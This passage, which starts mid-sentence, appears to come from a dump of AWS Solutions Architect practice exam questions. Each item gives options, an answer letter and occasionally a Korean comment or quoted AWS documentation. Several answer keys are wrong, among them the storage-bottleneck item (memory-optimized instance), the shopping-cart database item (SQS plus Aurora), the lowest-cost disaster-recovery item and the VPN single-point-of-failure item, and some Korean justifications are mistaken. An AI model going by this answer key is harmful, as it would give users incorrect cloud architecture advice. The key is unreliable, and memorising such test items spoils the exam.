credentials stored in the source code The database credentials need to be removed from the Lambda source code The credentials must then be securely stored and rotated on an ongoing basis to meet security policy requirements What should a solutions architect recommend to meet these requirements?\nA. Store the password in AWS CloudHSM Associate the Lambda function with a role that can retrieve the password from CloudHSM given its key ID B. Store the password in AWS Secrets Manager Associate the Lambda function with a role that can retrieve the password from Secrets Manager given its secret ID C. Move the database password to an environment variable associated with the Lambda function Retrieve the password from the environment variable upon execution D. Store the password in AWS Key Management Service (AWS KMS) Associate the Lambda function with a role that can retrieve the password from AWS KMS given its key ID \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A development team is collaborating with another company to create an integrated product. The other company needs to access an Amazon Simple Queue Service (Amazon SQS) queue that is contained in the development team\u0026rsquo;s account. The other company wants to poll the queue without giving up its own account permissions to do so. How should a solutions architect provide access to the SQS queue?\nA. Create an instance profile that provides the other company access to the SQS queue. B. Create an IAM policy that provides the other company access to the SQS queue. C. Create an SQS access policy that provides the other company access to the SQS queue. D. Create an Amazon Simple Notification Service (Amazon SNS) access policy that provides the other company access to the SQS queue. \r문제 풀이\r...\r\rAnswer: C  SQS에도 엑세스 정책을 설정할 수 있습니다.  \r\r\r   QUESTION A company wants to run a hybrid workload for data processing. The data needs to be accessed by on-premises applications for local data processing using an NFS protocol, and must also be accessible from the AWS Cloud for further analytics and batch processing. Which solution will meet these requirements?\nA. Use an AWS Storage Gateway file gateway to provide file storage to AWS, then perform analytics on this data in the AWS Cloud. B. Use an AWS storage Gateway tape gateway to copy the backup of the local data to AWS, then perform analytics on this data in the AWS cloud. C. Use an AWS Storage Gateway volume gateway in a stored volume configuration to regularly take snapshots of the local data, then copy the data to AWS. D. Use an AWS Storage Gateway volume gateway in a cached volume configuration to back up all the local storage in the AWS cloud, then perform analytics on this data in the cloud. \r문제 풀이\r...\r\rAnswer: A  NFS는 파일 게이트웨이를 통해 전송되어야 합니다.  \r\r\r   QUESTION A company has a multi-tier application deployed on several Amazon EC2 instances in an Auto Scaling group. An Amazon RDS for Oracle instance is the application'', data layer that uses Oracle-specific PUSQL functions. Traffic to the application has been steadily increasing This is causing the EC2 instances to become overloaded an i RDS instance to run out of storage. The Auto Scaling group does not have any scaling metrics and defines the minimum healthy instance count only. The company predicts that traffic will continue to increase at a steady but unpredictable rate before leveling off. What should a solutions architect do to ensure the system can automatically scale for the increased traffic? (Select TWO)\nA. Configure storage Auto Scaling on the RDS for Oracle instance. B. Migrate the database to Amazon Aurora to use Auto Scaling storage C. Configure an alarm on the RDS for Oracle instance for low free storage space. D. Configure the Auto Scaling group to use the average CPU as the scaling metric. E. Configure the Auto Scaling group to use the average free memory as the scaling metric. \r문제 풀이\r...\r\rAnswer: A C \r\r\r   QUESTION A company uses Amazon S3 as its object storage solution. The company has thousands of S3 it uses to store data. Some of the S3 bucket have data that is accessed less frequently than others. A solutions architect found that lifecycle policies are not consistently implemented or are implemented partially. resulting in data being stored in high-cost storage. Which solution will lower costs without compromising the availability of objects?\nA. Use S3 ACLs B. Use Amazon Elastic Block Store EBS) automated snapshots C. Use S3 inteligent-Tiering storage D. Use S3 One Zone-infrequent Access (S3 One Zone-IA). \r문제 풀이\r...\r\rAnswer: C \r\r\rB\n   QUESTION A company recently deployed a new auditing system to centralize information about operating system versions, patching, and installed software for Amazon EC2 instances. A solutions architect must ensure all instances provisioned through EC2 Auto Scaling groups successfully send reports to the auditing system as soon as they are launched and terminated. Which solution achieves these goals MOST efficiently?\nA. Use a scheduled AWS Lambda function and execute a script remotely on all EC2 instances to send data to the audit system. B. Use EC2 Auto Scaling lifecycle hooks to execute a custom script to send data to the audit system when instances are launched and terminated. C. Use an EC2 Auto Scaling launch configuration to execute a custom script through user data to send data to the audit system when instances are launched and terminated. D. Execute a custom script on the instance operating system to send data to the audit system. Configure the script to be executed by the EC2 Auto Scaling group when the instance starts and is terminated. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing a system to analyze the performance of financial markets while the markets are closed The system will run a series of compute-intensive jobs for 4 hours every night The time to complete the compute jobs is expected to remain constant, and jobs cannot be interrupted once started Once completed, the system is expected to run for a minimum of 1 year Which type of Amazon EC2 instances should be used to reduce the cost of the system?\nA. Spot Instances B. On-Demand Instances C. Standard Reserved Instances D. Scheduled Reserved Instances \r문제 풀이\r...\r\rAnswer: D  정기 예약은 사용시간까지도 설정이 되어 표준예약에 비해 가격이 더 저렴합니다.  \r\r\r   QUESTION A company maintains a searchable repository of items on its website Tie data is stored in an Amazon RDS for MySQL database table that contains over 10 million rows The database has 2 TB of General Purpose SSD (gp2) storage. There are millions of updates against this data every day through the company\u0026rsquo;s website The company has noticed some operations are taking 10 seconds or longer and has determined that the database storage performance is the bottleneck Which solution addresses the performance issue?\nA. Change the storage type to Provisioned IOPS SSD (io1) B. Change the instance to a memory-optimized instance class C. Change the instance to a burstable performance DB instance class D. Enable Multi-AZ RDS read replicas with MySQL native asynchronous replication \r문제 풀이\r...\r\rAnswer: B  병목현상인 경우 메모리 리소스를 최적화시킵니다.  \r\r\r   QUESTION An application hosted on AWS is experiencing performance problems, and the application vendor wants to perform an analysis of the log file to troubleshoot further. The log file is stored on Amazon S3 and is 10 GB in size. The application owner will make the log file available to the vendor for a limited time. What is the MOST secure way to do this?\nA. Enable public read on the S3 object and provide the link to the vendor. B. Upload the file to Amazon WorkDocs and share the public link with the vendor. C. Generate a presigned URL and have the vendor download the log file before it expires. D. Create an IAM user for the vendor to provide access to the S3 bucket and the application. Enforce multifactor authentication. \r문제 풀이\r...\r\rAnswer: C Explanation Share an object with others All objects by default are private. Only the object owner has permission to access these objects. However, the object owner can optionally share objects with others by creating a presigned URL, using their own security credentials, to grant time-limited permission to download the objects. When you create a presigned URL for your object, you must provide your security credentials, specify a bucket name, an object key, specify the HTTP method (GET to download the object) and expiration date and time. The presigned URLs are valid only for the specified duration. Anyone who receives the presigned URL can then access the object. For example, if you have a video in your bucket and both the bucket and the object are private, you can share the video with others by generating a presigned URL. https://docs.aws.amazon.com/AmazonS3/latest/dev/ShareObjectPreSignedURL.html\r\r\r\r   QUESTION A company runs a website on Amazon EC2 instances behind an ELB Application Load Balancer. Amazon Route 53 is used for the DNS. The company wants to set up a backup website with a message including a phone number and email address that users can reach if the primary website is down. How should the company deploy this solution?\nA. Use Amazon S3 website hosting for the backup website and Route 53 failover routing policy. B. Use Amazon S3 website hosting for the backup website and Route 53 latency routing policy. C. Deploy the application in another AWS Region and use ELB health checks for failover routing. D. Deploy the application in another AWS Region and use server-side redirection on the primary website. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company hosts its product information webpages on AWS. The existing solution uses multiple Amazon C2 instances behind an Application Load Balancer in an Auto Scaling group. The website also uses a custom DNS name and communicates with HTTPS only using a dedicated SSL certificate. The company is planning a new product launch and wants to be sure that users from around the world have the best possible experience on the new website. What should a solutions architect do to meet these requirements?\nA. Redesign the application to use Amazon CloudFront. B. Redesign the application to use AWS Elastic Beanstalk. C. Redesign the application to use a Network Load Balancer. D. Redesign the application to use Amazon S3 static website hosting. \r문제 풀이\r...\r\rAnswer: A Explanation What Is Amazon CloudFront?\nAmazon CloudFront is a web service that speeds up distribution of your static and dynamic web content, such as .html, .css, .js, and image files, to your users. CloudFront delivers your content through a worldwide network of data centers called edge locations. When a user requests content that you\u0026rsquo;re serving with CloudFront, the user is routed to the edge location that provides the lowest latency (time delay), so that content is delivered with the best possible performance. If the content is already in the edge location with the lowest latency, CloudFront delivers it immediately. If the content is not in that edge location, CloudFront retrieves it from an origin that you\u0026rsquo;ve definedsuch as an Amazon S3 bucket, a MediaPackage channel, or an HTTP server (for example, a web server) that you have identified as the source for the definitive version of your content. As an example, suppose that you\u0026rsquo;re serving an image from a traditional web server, not from CloudFront. For example, you might serve an image, sunsetphoto.png, using the URL http://example.com/sunsetphoto.png. Your users can easily navigate to this URL and see the image. But they probably don\u0026rsquo;t know that their request was routed from one network to another-through the complex collection of interconnected networks that comprise the internet-until the image was found. CloudFront speeds up the distribution of your content by routing each user request through the AWS backbone network to the edge location that can best serve your content. Typically, this is a CloudFront edge server that provides the fastest delivery to the viewer. Using the AWS network dramatically reduces the number of networks that your users' requests must pass through, which improves performance. Users get lower latency-the time it takes to load the first byte of the file-and higher data transfer rates. You also get increased reliability and availability because copies of your files (also known as objects) are now held (or cached) in multiple edge locations around the world. https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Introduction.html\n\r\r\r   QUESTION A solutions architect is working on optimizing a legacy document management application running on Microsoft Windows Server in an on-premises data center. The application stores a large number of files on a network file share The chief information officer wants to reduce the on-premises data center footprint and minimize storage costs by moving on-premises storage to AWS What should the solutions architect do to meet these requirements?\nA. Set up an AWS Storage Gateway file gateway. B. Set up Amazon Elastic File System (Amazon EFS) C. Set up AWS Storage Gateway as a volume gateway D. Set up an Amazon Elastic Block Store (Amazon EBS) volume. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company requires a durable backup storage solution for its on-premises database servers while ensuring on-premises applications maintain access to these backups for quick recovery. The company will use AWS storage services as the destination for these backups A solutions architect is designing a solution with minimal operational overhead Which solution should the solutions architect implement?\nA. Deploy an AWS Storage Gateway file gateway on-premises and associate it with an Amazon S3 bucket B. Back up the databases to an AWS Storage Gateway volume gateway and access it using the Amazon S3 API. C. Transfer the database backup files to an Amazon Elastic Block Store (Amazon EBS) volume attached to an Amazon EC2 instance. D. Back up the database directly to an AWS Snowball device and uss lifecycle rules to move the data to Amazon S3 Glacier Deep Archive. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company runs an application that uses multiple Amazon EC2 instances to gather data from its users The data is then processed and transferred to Amazon S3 for long-term storage A review of the application shows that there were long penods of time when the EC2 instances were not being used A solutions architect needs to design a solution that optimizes utilization and reduces costs. Which solution meets these requirements?\nA. Use Amazon EC2 in an Auto Scaling group with On-Demand instances. B. Build the application to use Amazon Lightsail with On-Demand Instances C. Create an Amazon CloudWatch cron job to automatically stop the EC2 instances when there is no activity D. Redesign the application to use an event-driven design with Amazon Simple Queue Service (Amazon SQS) and AWS Lambda. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is helping a developer design a new ecommerce shopping cart application using AWS services. The developer is unsure of the current database schema and expects to make changes as the ecommerce site grows. The solution needs to be highly resilient and capable of automatically scaling read and write capacity. Which database solution meets these requirements?\nA. Amazon Aurora PostgreSQL B. Amazon DynamoDB with on-demand enabled C. Amazon DynamoDB with DynamoDB Streams enabled D. Amazon SQS and Amazon Aurora PostgreSQL \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A three-tier web application processes orders from customers. The web tier consists of Amazon EC2 instances behind an Application Load Balancer, a middle tier of three EC2 instances decoupled from the web tier using Amazon SQS. and an Amazon DynamoDB backend. At peak times, customers who submit orders using the site have to wait much longer than normal to receive confirmations due to lengthy processing times. A solutions architect needs to reduce these processing times.\nWhich action will be MOST effective in accomplishing this?\nA. Replace the SQS queue with Amazon Kinesis Data Firehose. B. Use Amazon ElastiCache for Redis in front of the DynamoDB backend tier. C. Add an Amazon CloudFront distribution to cache the responses for the web tier. D. Use Amazon EC2 Auto Scaling to scale out the middle tier instances based on the SOS queue depth. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company built a food ordering application that captures user data and stores it for future analysis The application\u0026rsquo;s static front end is deployed on an Amazon EC2 instance The front-end application sends the requests to the backend application running on separate EC2 instance The backend application then stores the data in Amazon RDS What should a solutions architect do to decouple the architecture and make it scalable?\nA. Use Amazon S3 to serve the front-end application and write requests to an Amazon Simple Notification Service (Amazon SNS) topic Subscribe Amazon EC2 instances to the HTTP/HTTPS endpoint of the topic and process and store the data in Amazon RDS B. Use Amazon S3 to serve the front-end application which sends requests to Amazon EC2 to execute the backend application The backend application will process and store the data in Amazon RDS C. Use an EC2 instance to serve the front end and write requests to an Amazon SQS queue Place the backend instance in an Auto Scaling group and scale based on the queue depth to process and store the data in Amazon RDS D. Use Amazon S3 to serve the static front-end application and send requests to Amazon API Gateway which writes the requests to an Amazon SQS queue Place the backend instances in an Auto Scaling group and scale based on the queue depth to process and store the data in Amazon RDS \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect must design a solution for a persistent database that is being migrated from on-premises to AWS. The database requires 64,000 IOPS according to the database administrator. If possible, the database administrator wants to use a single Amazon Elastic Block Store (Amazon EBS) volume to host the database instance. Which solution effectively meets the database administrator\u0026rsquo;s criteria?\nA. Use an instance from the 13 I/O optimized family and leverage local ephemeral storage to achieve the IOPS requirement. B. Create an Nitro-based Amazon EC2 instance with an Amazon EBS Provisioned IOPS SSD (io1) volume attached. Configure the volume to have 64,000 IOPS. C. Create and map an Amazon Elastic File System (Amazon EFS) volume to the database instance and use the volume to achieve the required IOPS for the database. D. Provision two volumes and assign 32,000 IOPS to each. Create a logical volume at the operating system level that aggregates both volumes to achieve the IOPS requirements. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing storage for a high performance computing (HPC) environment based on Amazon Linux. The workload stores and processes a large amount of engineering drawings that require shared storage and heavy computing. Which storage option would be the optimal solution?\nA. Amazon Elastic File System (Amazon EFS) B. Amazon FSx for Lustre C. Amazon EC2 instance store D. Amazon EBS Provisioned IOPS SSD (io1) \r문제 풀이\r...\r\rAnswer: B Explanation Amazon FSx for Lustre Amazon FSx for Lustre is a new, fully managed service provided by AWS based on the Lustre file system. Amazon FSx for Lustre provides a high-performance file system optimized for fast processing of workloads such as machine learning, high performance computing (HPC), video processing, financial modeling, and electronic design automation (EDA). FSx for Lustre allows customers to create a Lustre filesystem on demand and associate it to an Amazon S3 bucket. As part of the filesystem creation, Lustre reads the objects in the buckets and adds that to the file system metadata. Any Lustre client in your VPC is then able to access the data, which gets cached on the high-speed Lustre filesystem. This is ideal for HPC workloads, because you can get the speed of an optimized Lustre file system without having to manage the complexity of deploying, optimizing, and managing the Lustre cluster. Additionally, having the filesystem work natively with Amazon S3 means you can shut down the Lustre filesystem when you don\u0026rsquo;t need it but still access objects in Amazon S3 via other AWS Services. FSx for Lustre also allows you to also write the output of your HPC job back to Amazon S3.\r\r\r\r   QUESTION A company\u0026rsquo;s operations teams has an existing Amazon S3 bucket configured to notify an Amazon SQS queue when new object are created within the bucket. The development team also wants to receive events when new objects are created. The existing operations team workflow must remain intact. Which solution would satisfy these requirements?\nA. Create another SQS queue Update the S3 events in bucket to also update the new queue when a new object is created. B. Create a new SQS queue that only allows Amazon S3 to access the queue, Update Amazon S3 update this queue when a new object is created C. Create an Amazon SNS topic and SQS queue for the Update. Update the bucket to send events to the new topic. Updates both queues to poll Amazon SNS. D. Create an Amazon SNS topic and SQS queue for the bucket updates. Update the bucket to send events to the new topic Add subscription for both queue in the topic. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A marketing company is storing CSV files in an Amazon S3 bucket for statistical analysis An application on an Amazon EC2 instance needs permission to efficiently process the CSV data stored in the S3 bucket. Which action will MOST securely grant the EC2 instance access to the S3 bucket?\nA. Attach a resource-based policy to the S3 bucket B. Create an IAM user for the application with specific permissions to the S3 bucket C. Associate an IAM role with least privilege permissions to the EC2 instance profile D. Store AWS credentials directly on the EC2 instance for applications on the instance to use for API calls \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company stores call recordings on a monthly basis Statistically, the recorded data may be referenced randomly within a year but accessed rarely after 1 year Files that are newer than 1 year old must be queried and retrieved as quickly as possible. A delay in retrieving older files is acceptable A solutions architect needs to store the recorded data at a minimal cost Which solution is MOST costeffective?\nA. Store individual files in Amazon S3 Glacier and store search metadata in object tags created in S3 Glacier Query S3 Glacier tags and retrieve the files from S3 Glacier B. Store individual files in Amazon S3 Use lifecycle policies to move the files to Amazon S3 Glacier after 1 year. Query and retrieve the files from Amazon S3 or S3 Glacier. C. Archive individual files and store search metadata for each archive in Amazon S3 Use lifecycle policies to move the files to Amazon S3 Glacier after 1 year Query and retrieve the files by searching for metadata from Amazon S3 D. Archive individual files in Amazon S3 Use lifecycle policies to move the files to Amazon S3 Glacier after 1 year Store search metadata in Amazon DynamoDB Query the files from DynamoDB and retrieve them from Amazon S3 or S3 Glacier \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company\u0026rsquo;s web application is using multiple Linux Amazon EC2 instances and storing data on Amazon EBS volumes. The company is looking for a solution to increase the resiliency of the application in case of a failure and to provide storage that complies with atomicity, consistency, isolation, and durability (ACID). What should a solutions architect do to meet these requirements?\nA. Launch the application on EC2 instances in each Availability Zone. Attach EBS volumes to each EC2 instance. B. Create an Application Load Balancer with Auto Scaling groups across multiple Availability Zones Mount an instance store on each EC2 instance C. Create an Application Load Balancer with Auto Scaling groups across multiple Availability Zones. Store data on Amazon EFS and mount a target on each instance. D. Create an Application Load Balancer with Auto Scaling groups across multiple Availability Zones Store data using Amazon S3 One Zone-Infrequent Access (S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: C Explanation How Amazon EFS Works with Amazon EC2 The following illustration shows an example VPC accessing an Amazon EFS file system. Here, EC2 instances in the VPC have file systems mounted. In this illustration, the VPC has three Availability Zones, and each has one mount target created in it. We recommend that you access the file system from a mount target within the same Availability Zone. One of the Availability Zones has two subnets. However, a mount target is created in only one of the subnets. Benefits of Auto Scaling Better fault tolerance. Amazon EC2 Auto Scaling can detect when an instance is unhealthy, terminate it, and launch an instance to replace it. You can also configure Amazon EC2 Auto Scaling to use multiple Availability Zones. If one Availability Zone becomes unavailable, Amazon EC2 Auto Scaling can launch instances in another one to compensate. Better availability. Amazon EC2 Auto Scaling helps ensure that your application always has the right amount of capacity to handle the current traffic demand. Better cost management. Amazon EC2 Auto Scaling can dynamically increase and decrease capacity as needed. Because you pay for the EC2 instances you use, you save money by launching instances when they are needed and terminating them when they aren\u0026rsquo;t. https://docs.aws.amazon.com/efs/latest/ug/how-it-works.html#how-it-works-ec2 https://docs.aws.amazon.com/autoscaling/ec2/userguide/auto-scaling-benefits.html\r\r\r\r   QUESTION A company with facilities in North America. Europe, and Asia is designing new distributed application to optimize its global supply chain and manufacturing process. The orders booked on one continent should be visible to all Regions in a second or less. The database should be able to support failover with a short Recovery Time Objective (RTO) The uptime of the application is important to ensure that manufacturing is not impacted What should a solutions architect recommend?\nA. Use Amazon DynamoDB global tables B. Use Amazon Aurora Global Database C. Use Amazon RDS for MySQL with a cross-Region read replica D. Use Amazon RDS for PostgreSQL with a cross-Region read replica \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company collects temperature, humidity, and atmospheric pressure data in cities across multiple continents. The average volume of data collected per site each day is 500 GB. Each site has a high-speed internet connection. The company\u0026rsquo;s weather forecasting applications are based in a single Region and analyze the data daily. What is the FASTEST way to aggregate data for all of these global sites?\nA. Enable Amazon S3 Transfer Acceleration on the destination bucket. Use multipart uploads to directly upload site data to the destination bucket. B. Upload site data to an Amazon S3 bucket in the closest AWS Region. Use S3 cross-Region replication to copy objects to the destination bucket. C. Upload site data to an Amazon S3 bucket in the closest AWS Region. Use S3 cross-Region replication to copy objects to the destination bucket. D. Upload the data to an Amazon EC2 instance in the closes Region. Store the data in an Amazon EBS volume. One a day take an EBS snapshot and copy it to the centralize Region. Restore the EBS volume in the centralized Region and run an analysis on the data daily. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A healthcare company stores highly sensitive patient records. Compliance requires that multiple copies be stored in different locations Each record must be stored for 7 years. The company has a service level agreement (SLA) to provide records to government agencies immediately for the first 30 days and then within 4 hours of a request thereafter. What should a solutions architect recommend?\nA. Use Amazon S3 with cross-Region replication enabled After 30 days, transition the data to Amazon S3 Glacier using lifecycle policy B. Use Amazon S3 with cross-origin resource sharing (CORS) enabled. After 30 days, transition the data to Amazon S3 Glacier using a lifecycle policy. C. Use Amazon S3 with cross-Region replication enabled After 30 days, transition the data to Amazon S3 Glacier Deep Achieve using a lifecycle policy D. Use Amazon S3 with cross-origin resource sharing (GORS) enabled After 30 days, transition the data to Amazon S3 Glacier Deep Archive using a lifecycle policy \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company running an on-premises application is migrating the application to AWS to increase its elasticity and availability. The current architecture uses a Microsoft SQL Server database with heavy read activity. The company wants to explore alternate database options and migrate database engines, if needed. Every 4 hours, the development team does a full copy of the production database to populate a test database. During this period, users experience latency. What should a solution architect recommend as replacement database?\nA. Use Amazon Aurora with Multi-AZ Aurora Replicas and restore from mysqldump for the test database. B. Use Amazon Aurora with Multi-AZ Aurora Replicas and restore snapshots from Amazon RDS for the test database. C. Use Amazon RDS for MySQL with a Multi-AZ deployment and read replicas, and use the standby instance for the test database. D. Use Amazon RDS for SQL Server with a Multi-AZ deployment and read replicas, and restore snapshots from RDS for the test database. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is designing a security solution for a company that wants to provide developers with individual AWS accounts through AWS Organizations, while also maintaining standard security controls. Because the individual developers will have AWS account root user-level access to their own accounts, the solutions architect wants to ensure that the mandatory AWS CloudTrail configuration that is applied to new developer accounts is not modified. Which action meets these requirements?\nA. Create an IAM policy that prohibits changes to CloudTrail, and attach it to the root user. B. Create a new trail in CloudTrail from within the developer accounts with the organization trails option enabled. C. Create a service control policy (SCP) the prohibits changes to CloudTrail, and attach it the developer accounts. D. Create a service-linked role for CloudTrail with a policy condition that allows changes only from an Amazon Resource Name (ARN) in the master account. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has a website running on Amazon EC2 instances across two Availability Zones. The company is expecting spikes in traffic on specific holidays, and wants to provide a consistent user experience. How can a solutions architect meet this requirement?\nA. Use step scaling. B. Use simple scaling. C. Use lifecycle hooks. D. Use scheduled scaling. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is designing a multi-Region disaster recovery solution for an application that will provide public API access. The application will use Amazon EC2 instances with a userdata script to load application code and an Amazon RDS for MySQL database The Recovery Time Objective (RTO) is 3 hours and the Recovery Point Objective (RPO) is 24 hours. Which architecture would meet these requirements at the LOWEST cost?\nA. Use an Application Load Balancer for Region failover. Deploy new EC2 instances with the userdata script. Deploy separate RDS instances in each Region B. Use Amazon Route 53 for Region failover Deploy new EC2 instances with the userdata script Create a read replica of the RDS instance in a backup Region C. Use Amazon API Gateway for the public APIs and Region failover Deploy new EC2 instances with the userdata script Create a MySQL read replica of the RDS instance in a backup Region D. Use Amazon Route 53 for Region failover Deploy new EC2 instances with the userdata scnpt for APIs, and create a snapshot of the RDS instance daily for a backup Replicate the snapshot to a backup Region \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION An application runs on Amazon EC2 instances in private subnets. The application needs to access an Amazon DynamoDB table. What is the MOST secure way to access the table while ensuring that the traffic does not leave the AWS network?\nA. Use a VPC endpoint for DynamoDB. B. Use a NAT gateway in a public subnet. C. Use a NAT instance in a private subnet. D. Use the internet gateway attached to the VPC. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has two VPCs named Management and Production. The Management VPC uses VPNs through a customer gateway to connect to a single device in the data center The Production VPC uses a virtual private gateway with two attached AWS Direct Connect connections. The Management and Production VPCs both use a single VPC peering connection to allow communication between the applications. What should a solutions architect do to mitigate any single point of failure in this architecture?\nA. Add a set of VPNs between the Management and Production VPCs. B. Add a second virtual private gateway and attach it to the Management VPC C. Add a second set of VPNs to the Management VPC from a second customer gateway device D. Add a second VPC peering connection between the Management VPC and the Production VPC. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company receives inconsistent service from its data center provider because the company is headquartered in an area affected by natural disasters. The company is not ready to fully migrate to the AWS Cloud, but it wants a failure environment on AWS in case the on-premises data center fails. The company runs web servers that connect to external vendors. The data available on AWS and on premises must be uniform. Which solution should a solutions architect recommend that has the LEAST amount of downtime?\nA. Configure an Amazon Route 53 failover record. Run application servers on Amazon EC2 instances behind an Application Load Balancer in an Auto Scaling group. Set up AWS Storage Gateway with stored volumes to back up data to Amazon S3. B. Configure an Amazon Route 53 failover record. Execute an AWS CloudFormation template from a script to create Amazon EC2 instances behind an Application Load Balancer. Set up AWS Storage Gateway with stored volumes to back up data to Amazon S3. C. Configure an Amazon Route 53 failover record. Set up an AWS Direct Connect connection between a VPC and the data center. Run application servers on Amazon EC2 in an Auto Scaling group. Run an AWS Lambda function to execute an AWS CloudFormation template to create an Application Load Balancer. D. Configure an Amazon Route 53 failover record. Run an AWS Lambda function to execute an AWS CloudFormation template to launch two Amazon EC2 instances. Set up AWS Storage Gateway with stored volumes to back up data to Amazon S3. Set up an AWS Direct Connect connection between a VPC and the data center. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company mandates that an Amazon S3 gateway endpoint must allow traffic to trusted buckets only Which method should a solutions architect implement to meet this requirement?\nA. Create a bucket policy for each of the company\u0026rsquo;s trusted S3 buckets that allows traffic only from the company\u0026rsquo;s trusted VPCs B. Create a bucket policy for each of the company\u0026rsquo;s trusted S3 buckets that allows traffic only from the company\u0026rsquo;s S3 gateway endpoint IDs C. Create an S3 endpoint policy for each of the company\u0026rsquo;s S3 gateway endpoints that blocks access from any VPC other than the company\u0026rsquo;s trusted VPCs D. Create an S3 endpoint policy for each of the company\u0026rsquo;s S3 gateway endpoints that provides access to the Amazon Resource Name (ARN) of the trusted S3 buckets \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A Solutions Architect must design a web application that will be hosted on AWS, allowing users to purchase access to premium, shared content that is stored in an S3 bucket. Upon payment, content will be available for download for 14 days before the user is denied access Which of the following would be the LEAST complicated implementation?\nA. Use an Amazon CloudFront distribution with an origin access identity (OAI) Configure the distribution with an Amazon S3 origin to provide access to the file through signed URL\u0026rsquo;s Design a Lambda function to remove data that is older than 14 days. B. Use an S3 bucket and provide direct access to the tile Design the application to track purchases in a DynamoDH table Configure a Lambda function to remove data that is older than 14 days based on a query to Amazon DynamoDB C. Use an Amazon CloudFront distribution with an OAI Configure the distribution with an Amazon S3 origin to provide access to the file through signed URLs Design the application to sot an expiration of 14 days for the URL D. Use an Amazon CloudFront distribution with an OAI Configure the distribution with an Amazon S3 origin to provide access to the file through signed URLs Design the application to set an expiration of 60 minutes for the URL and recreate the URL as necessary \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company provides an API to its users that automates inquiries for tax computations based on item prices. The company experiences a larger number of inquiries during the holiday season only that cause slower response times. A solutions architect needs to design a solution that is scalable and elastic What should the solutions architect do to accomplish this?\nA. Provide an API hosted on an Amazon EC2 instance. The EC2 instance performs the required computations when the API request is made. B. Design a REST API using Amazon API Gateway that accepts the item names API Gateway passes item names to AWS Lambda for tax computations C. Create an Application Load Balancer that has two Amazon EC2 instances behind it. The EC2 instances will compute the tax on the received item names. D. Design a REST API using Amazon API Gateway that connects with an API hosted on an Amazon EC2 instance API Gateway accepts and passes the item names to the EC2 instance for tax computations \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company uses Application Load Balancers (ALBs) in different AWS Regions. The ALBs receive inconsistent traffic that can spike and drop throughout the year The company\u0026rsquo;s networking team needs to allow the IP addresses of the ALBs in the on-premises firewall to enable connectivity. Which solution is the MOST scalable with minimal configuration changes?\nA. Write an AWS Lambda script to get the IP addresses of the ALBs in different Regions Update the on-premises firewall\u0026rsquo;s rule to allow the IP addresses of the ALBs. B. Migrate all ALBs in different Regions to the Network Load Balancers (NLBs) Update the onpremises firewall\u0026rsquo;s rule to allow the Elastic IP addresses of all the NLBs. C. Launch AWS Global Accelerator Register the ALBs in different Regions to the accelerator. Update the on-premises firewall\u0026rsquo;s rule to allow static IP addresses associated with the accelerator. D. Launch a Network Load Balancer (NLB) in one Region Register the private IP addresses of the ALBs m different Regions with the NLB Update the on-premises firewall\u0026rsquo;s rule to allow the Elastic IP address attached to the NLB. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A solution architect must migrate a Windows internet information Services (IIS) web application to AWS. The application currently relies on a file share hosted in the user\u0026rsquo;s on-premises network-attached storage (NAS). The solution architected has proposed migrating the IIS web servers Which replacement to the on-promises filo share is MOST resilient and durable?\nA. Migrate the file Share to Amazon RDS. B. Migrate the tile Share to AWS Storage Gateway C. Migrate the file Share to Amazon FSx dor Windows File Server. D. Migrate the tile share to Amazon Elastic File System (Amazon EFS) \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is building applications in containers. The company wants to migrate its onpremises development and operations services from its on-premises data center to AWS. Management states that production system must be cloud agnostic and use the same configuration and administrator tools across production systems. A solutions architect needs to design a managed solution that will align open-source software. Which solution meets these requirements?\nA. Launch the containers on Amazon EC2 with EC2 instance worker nodes. B. Launch the containers on Amazon Elastic Kubernetes Service (Amazon EKS) and EKS workers nodes. C. Launch the containers on Amazon Elastic Containers service (Amazon ECS) with AWS Fargate instances. D. Launch the containers on Amazon Elastic Container Service (Amazon EC) with Amazon EC2 instance worker nodes. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company currently operates a web application backed by an Amazon RDS MySQL database It has automated backups that are run daily and are not encrypted A security audit requires future backups to be encrypted and the unencrypted backups to be destroyed The company will make at least one encrypted backup before destroying the old backups What should be done to enable encryption for future backups?\nA. Enable default encryption for the Amazon S3 bucket where backups are stored B. Modify the backup section of the database configuration to toggle the Enable encryption check box C. Create a snapshot of the database Copy it to an encrypted snapshot Restore the database from the encrypted snapshot D. Enable an encrypted read replica on RDS for MySQL Promote the encrypted read replica to primary Remove the original database instance \r문제 풀이\r...\r\rAnswer: C Explanation However, because you can encrypt a copy of an unencrypted DB snapshot, you can effectively add encryption to an unencrypted DB instance. That is, you can create a snapshot of your DB instance, and then create an encrypted copy of that snapshot. You can then restore a DB instance from the encrypted snapshot, and thus you have an encrypted 